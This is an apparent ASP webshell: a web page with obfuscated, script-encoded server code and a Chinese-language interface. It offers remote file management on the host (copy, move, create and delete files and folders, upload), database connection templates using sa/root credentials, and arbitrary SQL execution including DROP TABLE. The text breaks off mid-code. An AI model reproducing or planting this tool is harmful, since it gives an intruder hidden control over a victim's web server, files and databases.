@&dP,j('UqLJ'x8dai@!l,4D0xvNl\Cd1DrwDlwEs^?$V?DDvEJr[j;^?O.LJJrSJLnlTnQFLJ*B@*��һҳ@!&C@*[U4k2i@!l~4M+0xvNl-lk^Mk2D)wEV^?$s?DDcJrJ'j$V?D.[rJJBE'ng[r#v@*βҳ@!&m@*E@#@&~P,P3U9PqW@#@&P~P,j&'j&[r@!tMP1GVKDxB[2o3w2sE@*@!JYN@*@!&YM@*@!zOl8s@*E@#@&~P,P]dcZVGd)j+D~"/xgWDtk	o@#@&d@#@&7I/2G	/+c	DbY+,j()Uq{JE@#@&~,2s/7P,P@#@&,PP~/KxURAam;D+v?;^?D.#@#@&~P,Pj({?qLE?5S��䣺JLj5VUYM@#@&P~3	N~q6@#@&@#@&~~"+/2G	/nRq.bYn,?&)?&'rE@#@&2UN,qW@#@&@#@&,~ZKxxc/sWk+@#@&~PjnDP/W	U'gWO4bxo@#@&,P3x9~&0@#@&2	NPwE	^YbWU@#@&u6kHAA==^#~@%>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title><%=#@~^FAAAAA==hglh[rPO,JLj+M\nD&n+wUAAA==^#~@%></title>
<style type="text/css">
<!--
  body,td {font-size: 12px;}
  input,select{font-size: 12px;background-color:#FFFFFF;}
  .tr {background-color:#EFEFEF;}
  .cmd {background-color:#000000;color:#FFFFFF}
  body {margin-left: 0px;margin-top: 0px;margin-right: 0px;margin-bottom: 0px;
    <%#@~^RwAAAA==(6P)1YbWx{Jr~Y4+UPM+d2Kx/ hMkY~EW7+M0sWARX)4k9[+	iG-D0sGSOz)4r9Nn	irvhkAAA==^#~@%>}
  a {color: black;text-decoration: none;}
  .am {color: #003366;font-size: 11px;}
-->
</style>
<script language="javascript">
<!--
  function yesok(){
    if (confirm("ȷ��Ҫִ�д˲�����"))
		return true;
	else
		return false;
    }

  function ShowFolder(Folder){
    top.addrform.FolderPath.value = Folder;
    top.addrform.submit();
    }

  function FullForm(FName,FAction){
    top.hideform.FName.value = FName;
	if(FAction=="CopyFile"){
	    DName = prompt("�����븴�Ƶ�Ŀ���ļ�ȫ����",FName);
	    top.hideform.FName.value += "||||"+DName;
	}else if(FAction=="MoveFile"){
	    DName = prompt("�������ƶ���Ŀ���ļ�ȫ����",FName);
	    top.hideform.FName.value += "||||"+DName;
    }else if(FAction=="CopyFolder"){
	    DName = prompt("�������ƶ���Ŀ���ļ���ȫ����",FName);
	    top.hideform.FName.value += "||||"+DName;
    }else if(FAction=="MoveFolder"){
	    DName = prompt("�������ƶ���Ŀ���ļ���ȫ����",FName);
	    top.hideform.FName.value += "||||"+DName;
	}else if(FAction=="NewFolder"){
	    DName = prompt("������Ҫ�½����ļ���ȫ����",FName);
	    top.hideform.FName.value = DName;
	}else if(FAction=="CreateMdb"){
	    DName = prompt("������Ҫ�½���Mdb�ļ�ȫ����,ע�ⲻ��ͬ����",FName);
        top.hideform.FName.value = DName;
	}else if(FAction=="CompactMdb"){
	    DName = prompt("������Ҫѹ����Mdb�ļ�ȫ����,ע���ļ��Ƿ���ڣ�",FName);
        top.hideform.FName.value = DName;
	}else{
	    DName = "Other"; 
	}
	
	if(DName!=null){
      top.hideform.Action.value = FAction;
      top.hideform.submit();
	}else{
      top.hideform.FName.value = "";
	}
  }
  
  function DbCheck(){
    if(DbForm.DbStr.value == ""){
	  alert("�����������ݿ�");
	  FullDbStr(0);
	  return false;
	}
	return true;
  }
  
  function FullDbStr(i){
   if(i<0){
     return false;
   }
    Str = new Array(12);  
	Str[0] = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=<%=#@~^HQAAAA==]nCDtv?+k/bGxvJoW^Nn.hlY4E#*9wkAAA==^#~@%>\\db.mdb;Jet OLEDB:Database Password=***";
	Str[1] = "Driver={Sql Server};Server=<%=#@~^CAAAAA==jD-D&nEAMAAA==^#~@%>,1433;Database=DbName;Uid=sa;Pwd=****";
	Str[2] = "Driver={MySql};Server=<%=#@~^CAAAAA==jD-D&nEAMAAA==^#~@%>;Port=3306;Database=DbName;Uid=root;Pwd=****";
	Str[3] = "Dsn=DsnName";
	Str[4] = "SELECT * FROM [TableName] WHERE ID<100";
	Str[5] = "INSERT INTO [TableName](USER,PASS) VALUES(\'username\',\'password\')";
	Str[6] = "DELETE FROM [TableName] WHERE ID=100";
	Str[7] = "UPDATE [TableName] SET USER=\'username\' WHERE ID=100";
	Str[8] = "CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))";
	Str[9] = "DROP TABLE [TableName]";
	Str[10]= "ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)";
	Str[11]= "ALTER TABLE [TableName] DROP COLUMN PASS";
	Str[12]= "��ֻ��ʾһ������ʱ������ʾ�ֶε�ȫ���ֽڣ������������Ʋ�ѯʵ��.\n����һ������ֻ��ʾ�ֶε�ǰ��ʮ���ֽڡ�";
	if(i<=3){
	  DbForm.DbStr.value = Str[i];
	  DbForm.SqlStr.value = "";
	  abc.innerHTML="<center>��ȷ�ϼ��������ݿ�������SQL����������䡣</center>";
	}else if(i==12){
	  alert(Str[i]);
	}else{
	  DbForm.SqlStr.value = Str[i];
	}
	return true;
  } 
  
  
  function FullSqlStr(str,pg){
    if(DbForm.DbStr.value.length<5){
	  alert("�������ݿ����Ӵ��Ƿ���ȷ!")
	  return false;
	}
    if(str.length<10){
	  alert("����SQL����Ƿ���ȷ!")
	  return false;
	}
    DbForm.SqlStr.value = str ;
	DbForm.Page.value = pg;
	abc.innerHTML="";
	DbForm.submit();
    return true;
  }
-->
</script>
</head>
<%#@~^Bi0AAA==@#@&frsP:F@#@&Z^C/kPin;@#@&~,fks~f8~fy@#@&@#@&P,n;4sr1PoE	^YbWU~wWDhcw#@#@&,~,Po{V1l/`wb@#@&P~P,qW~GFRakkY/vobPDtxlsG.s'9Fvo#=+sd)sG.s'EJ=n	N~b0@#@&P,2	[PwEUmDkGU@#@&@#@&~PhE4^r^PwE	mOkGU,j)`wb@#@&P~~,s's^m/n`wb@#@&~,P,q0,fy +XkdYk`ob,YtU)k+Y,i)'G vsb)nsk+l/OP`bxUhPo(w)nx9~b0@#@&P,2x9Pw;x1YrW	@#@&@#@&PPh.k7lY~jE(P;VC/dm&xrYbCVbyn@#@&PP9rsPPfmS:?OB\(ZD^0BPq	~9qAx[S: ~:J+	~KwJS?w.BsjYC.D~o2	[~G?OCMY~93	NSjaHm:n@#@&,PP,/OPGFxZM+COr4NnmD`r(PccB!*#@#@&7r6P]+$;+kY PKYls$HYn/@!q,Y4x,26bY,jE(@#@&P,P~dYP:qP{PZMnCYr(LnmOc}4P`+S!*#@#@&iKF PHwnP{~8Pl,K8RHKN~'2PlP:F 6a+x@#@&P,PP:q MkD+~P]n$En/D AbxC.HI+C[vIn;!nkY :WDlV~XDn/*@#@&P,P~P8RnKdkDkW	xTP=P:fCPxP8R]+m[P=P9jDlDO~{Pq@#@&~,P~G2	NP{Pdnx~`Pfm#@#@&,PP,d+DPfyx/DlD+64%n1Ycr(P`W~Tb*@#@&7-(Z.V6~{P^4D~`F2#,'P1t.AvFTb@#@&P,~Pk+Y,P+P{P;DnlOn}4%+1O`}4Pc+~!bb@#@&~P,~:?O,',Hk9AvPfm~q~,qUjDDAv9?DlDDSPfm~74/DsW*Oq#@#@&P,P~Pd+x~x,Snx~~vKjD#@#@&P,P,9?Dl.Y{fjOmDY3PSx_8@#@&P,P,h4ksn,`9?DCDDPQ~8!#~@!,f3x9@#@&P~,P,Pf&2	[P{P(xUY.$vf?DCDD~KGCS\(ZMVWP'~74/D^W#
3&@#@&,PP~~,K+R:za+~{P8P),Ky HKNnP{&~l,K c6wx@#@&~~P,P,KqRKGkkOkKUP{P9jDlDO@#@&P~P,~,KqcZKwX:W,P Bf(2	NR9UYlMO@#@&PP,~~P: cnG/rObWUP{~!,)~PyRKz2PxPy~=PPyR;tlM/OP{JL4y&q+r@#@&,~P,PP:(UP{P:  InC9Kn6D~),K+ ;VWdn@#@&~P,~,P9UYmDY,',(xUY.Avf(3	N~:9lBK?Db@#@&,P,P~PojDl.Y,xP&xjOM` +S:qU~rUm:n{JrJ~8#3@#@&P~P,P~oAxN,xP&x?D.csUYmDO~P(	~EJrE~8#@#@&,PP~~,j21mhPx,V1l/`trN,`Pq	~ojDlDDSsAxN ojYmDD#b@#@&~,P~P,r0,qUjDDPc*l~Pq	Sr0r^+	l:'rEJBFbP@*PT~Dt+	@#@&,PP,~~P,/Y~KoJ{xnh,oqw@#@&~,PP~~,Po?DCMY~{P&x?DDvo2	NSK&xSE6kVUls+'rEE~8#3FT@#@&~,P~P,~Pw2U[,'P(UUY.`wjDl.D~:qxBJrEJBFb@#@&P~~,PP,~sUYlMO~',q	?ODcoAx[~:(xBJ/G	Y+UO Kzwl,JS8#3Fc@#@&,~P,P~P,s3U9P',(xUYDvojYmDD~PqUS74/D*@#@&,P~~,PP~PwS sbs?OmDDP'GqAUN@#@&~P,P~~,PKwJRwkVjryP{P9?OCMY~OG(2	N~R2@#@&~~,P~P,~b0~	WDPfyRAakkYd``wHCs+#,Otx@#@&~~P,P,P~P~9yRCN9~ja1Ch~KoJ@#@&~P,~,P~,+	NPb0@#@&P,P~P,+sd@#@&,~P,PP,~P cKHwnPxq,)~Ky HKNn~{&Pl~:  ran	@#@&,P,PP,P,PFcnG/bYrG	P',9qAxN,l~K8R;W2XPG,K+~GjYmDORGq2U[ &@#@&,~,P~,P,K cnKdkDkGx,'~T,)P:+R:Xw~xPy@#@&P~P~~,P~Ky Z4l.dYPxET4+&
8+r@#@&,P,PP,P,jsjPxP:  ]lN:n6D@#@&,~~P,P,PP  /^Wd+@#@&P,P~~,PPrW,fqRAab/Ok``w1m:bPDtnx@#@&~~,PP,~P,Pf8ciwgls+b'9qvj21mh+*[ES,J[joj@#@&P,~,P~,PV/@#@&~P,P~P,P~~GFRz[N,jwgCh+B?w.@#@&~~,P~P,~+	N~r6@#@&~~,P~PU9Pr6@#@&PP,P,~fUYCDD'9jDlDDQKd+x3q@#@&,P,PA+U[@#@&~P,~KGlxEr@#@&~~,Pd+D~: ~{xKYtbxT@#@&,P3x9Pj;(@#@&,~@#@&PPh.r\mYPjE8~;VC/kmKDhr	lYn@#@&P~P,r6P];!+/DR:GYmV$XD+d@*ZPY4nx@#@&P,~~P,f8R]+hG7+)V^lfyR]nsW\n)^V@#@&,~,P~,/YPGF{UWDtrxT)dnDPfyxxKYtbUL@#@&P,P~P~P8R/VKd+=/nO,KF~x	WOtbUT@#@&,P,P+	N,r0@#@&~PAx[~UE4@#@&2	NP;sC/k@#@&@#@&ZsCk/~s&o@#@&Nrh,sksnUk"+BobVnUYmDY@#@&,~nMk-lD+~j!4P;slk/{&UrYbl^k"+@#@&,Pok^n?byn~{P!@#@&,Pok^nUYCMY{P!@#@&,~2	N~?!4@#@&,P@#@&~PhE4^r^P6E	mOkGU,?C\)/vsb@#@&PP[rsPP&@#@&,Pjm\b/{YM;+@#@&~Pb0~OMk:vo#{JJ,G.Pwk^+jYC.D'TPD4+	PnabYPW;	mOkKU@#@&~,/YP:&{/DlO+}4%n1Y`}8Kvv~Zbb@#@&P,P~PPfcHGNx&,)~P2RKz2'qP=~:& }wx@#@&P,~P,KqRaWdrDkW	xsbV+UOCDD@#@&P~P~~:F mK2XDW~P2~srs?ry@#@&P~,P,K&c?m-+:Wok^+~oB @#@&~P,PP:f Z^Wk+@#@&~~,P~/OP:&xUKYtrUT@#@&P,~,Pjm\b/{0ms/@#@&P,PnU9P0!UmDkW	@#@&2	N,
Zsldd@#@&@#@&@#@&Z^ldd,SAo@#@&P~fbh,Zo@#@&,PnMk7CYPjE(P/sm//|(xbYkmsry@#@&P~P~jAK~ZwxZM+COr4%n1Ycr(Pv!SZ#*@#@&,
